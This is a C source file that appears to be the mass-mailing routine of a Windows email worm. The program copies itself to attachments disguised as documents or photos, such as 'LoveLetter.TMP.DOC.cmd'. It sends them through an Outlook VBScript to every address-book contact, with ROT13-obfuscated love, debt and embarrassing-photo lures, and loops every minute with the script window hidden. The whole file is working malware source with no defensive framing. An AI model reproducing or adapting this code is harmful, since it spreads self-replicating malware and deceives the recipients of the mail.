#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shellapi.h>

DWORD WINAPI _MassMailMain(void)
{
    char Subject[100], Message[512], Attachment[100], MyPath[100], VBSFile[50], RanNu[20];
    unsigned char VBS_Mail[2000];
    FILE *file;

    while (1) {
        memset(Subject, 0, sizeof(Subject));
        memset(Message, 0, sizeof(Message));
        memset(Attachment, 0, sizeof(Attachment));
        memset(MyPath, 0, sizeof(MyPath));
        memset(VBS_Mail, 0, sizeof(VBS_Mail));
        memset(VBSFile, 0, sizeof(VBSFile));
        memset(RanNu, 0, sizeof(RanNu));

        srand(GetTickCount());
        sprintf(RanNu, "\\mailer.vbs");
        GetEnvironmentVariableA("HOMEDRIVE", Attachment, sizeof(Attachment));
        strcpy(VBSFile, Attachment);
        strcat(VBSFile, RanNu);
        GetModuleFileNameA(NULL, MyPath, sizeof(MyPath));

        switch (rand() % 5) {
            case 0:
                strcpy(Subject, "Zl cnffvbangr ybir gbjneqf lbh");
                strcpy(Message, "Zl ybiryrggre sbe lbh vf va gur nggnpurq qbphzrag. =)");
                strcat(Attachment, "\\LoveYouLife.TMP.DOC.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
            case 1:
                strcpy(Subject, "Lbh bjr zr ovt gvzr");
                strcpy(Message, "Lbh pna'g whfg sbetrg nobhg gur ovyy lbh yrsg zr jvgu. V nggnpurq gb gur qbphzragf nf cebbs lbh bjr zr.");
                strcat(Attachment, "\\DocumentsPay.TMP.DOC.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
            case 2:
                strcpy(Subject, "Url! Purpx guvf bhg!");
                strcpy(Message, "V guvax gung'f lbh va guvf cvpgher, ubj rzonerffvat!");
                strcat(Attachment, "\\PartyTips.TMP.JPEG.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
            case 3:
                strcpy(Subject, "Vf gung lbh?");
                strcpy(Message, "V erpnyy lbh orvat va guvf cvpgher, juvpu crefba ner lbh?");
                strcat(Attachment, "\\BeachPicture.TMP.JPEG.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
            case 4:
                strcpy(Subject, "V YBIR LBH!");
                strcpy(Message, "Cyrnfr ernq gur nggnpurq ybir yrggre sebz zr. ;)");
                strcat(Attachment, "\\LoveLetter.TMP.DOC.cmd");
                CopyFileA(MyPath, Attachment, FALSE);
                _CiphStr(Attachment, Attachment);
                break;
        }

        sprintf(VBS_Mail,
                 "qvz k\r\n"
                 "erz\r\n"
                 "ba reebe erfhzr arkg\r\n"
                 "erz\r\n"
                 "Frg sfb =\"Fpevcgvat.SvyrFlfgrz.Bowrpg\"\r\n"
                 "erz\r\n"
                 "Frg fb=PerngrBowrpg(sfb)\r\n"
                 "erz\r\n"
                 "Frg by=PerngrBowrpg(\"Bhgybbx.Nccyvpngvba\")\r\n"
                 "erz\r\n"
                 "Frg bhg=JFpevcg.PerngrBowrpg(\"Bhgybbx.Nccyvpngvba\")\r\n"
                 "erz\r\n"
                 "Frg zncv = bhg.TrgAnzrFcnpr(\"ZNCV\")\r\n"
                 "erz\r\n"
                 "Frg n = zncv.NqqerffYvfgf(1)\r\n"
                 "erz\r\n"
                 "Frg nr=n.NqqerffRagevrf\r\n"
                 "erz\r\n"
                 "Sbe k=1 Gb nr.Pbhag\r\n"
                 "erz\r\n"
                 "Frg pv=by.PerngrVgrz(0)\r\n"
                 "erz\r\n"
                 "Frg Znvy=pv\r\n"
                 "erz\r\n"
                 "Znvy.gb=by.TrgAnzrFcnpr(\"ZNCV\").NqqerffYvfgf(1).NqqerffRagevrf(k)\r\n"
                 "erz\r\n"
                 "Znvy.Fhowrpg=\"%s\"\r\n"
                 "erz\r\n"
                 "Znvy.Obql=\"%s\"\r\n"
                 "erz\r\n"
                 "Znvy.Nggnpuzragf.Nqq(\"%s\")\r\n"
                 "erz\r\n"
                 "Znvy.fraq\r\n"
                 "erz\r\n"
                 "Arkg\r\n"
                 "erz\r\n"
                 "by.Dhvg\r\n",
                 Subject, Message, Attachment);

        _CiphStr((char *)VBS_Mail, (char *)VBS_Mail);

        file = fopen(VBSFile, "wb");
        fputs((const char *)VBS_Mail, file);
        fclose(file);

        ShellExecuteA(NULL, "open", VBSFile, NULL, NULL, SW_HIDE);
        Sleep(60000);
    }
    return 0; // unreachable
}
